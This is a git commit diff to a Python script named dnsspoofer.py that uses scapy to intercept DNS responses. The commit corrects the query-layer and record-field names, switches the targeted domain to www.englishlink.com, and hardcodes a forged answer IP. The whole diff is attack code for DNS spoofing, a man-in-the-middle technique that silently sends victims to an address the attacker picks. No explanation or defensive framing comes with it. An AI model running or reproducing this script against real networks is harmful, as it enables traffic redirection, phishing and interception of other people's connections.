90115fb935d66201821ba752e3955e4b997da299
LEE KHEANG <38646804+leekheang@users.noreply.github.com>
2019-06-15 01:44:25 +0700

    Update dnsspoofer.py

--- dnsspoofer.py
+++ dnsspoofer.py
@@ -6,10 +6,10 @@ import scapy.all as scapy
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR): 
-        qname = scapy_packet[scapy.DNSSRR].qname
-        if "www.bing.com" in qname:
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.englishlink.com" in qname:
            print("[+] Spoofing target ")
-           answer = scapy.DNSRR(rname = qname, rdata="ip")
+           answer = scapy.DNSRR(rrname = qname, rdata="31.13.95.36")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
 
